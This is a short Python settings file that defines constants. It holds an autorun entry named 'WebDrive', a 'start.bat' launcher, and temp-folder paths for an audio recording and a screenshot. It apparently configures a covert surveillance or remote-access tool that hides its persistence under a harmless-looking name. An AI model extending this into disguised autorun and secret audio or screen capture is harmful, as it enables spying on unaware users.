import os
import tempfile

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
TEMP_DIR = tempfile.gettempdir()

AUTORUN_NAME = "WebDrive"
RUN_FILENAME = "start.bat"

RECORD_PATH = os.path.join(TEMP_DIR, "sound.wav")
SCREENSHOT_PATH = os.path.join(TEMP_DIR, "screenshot.jpg")
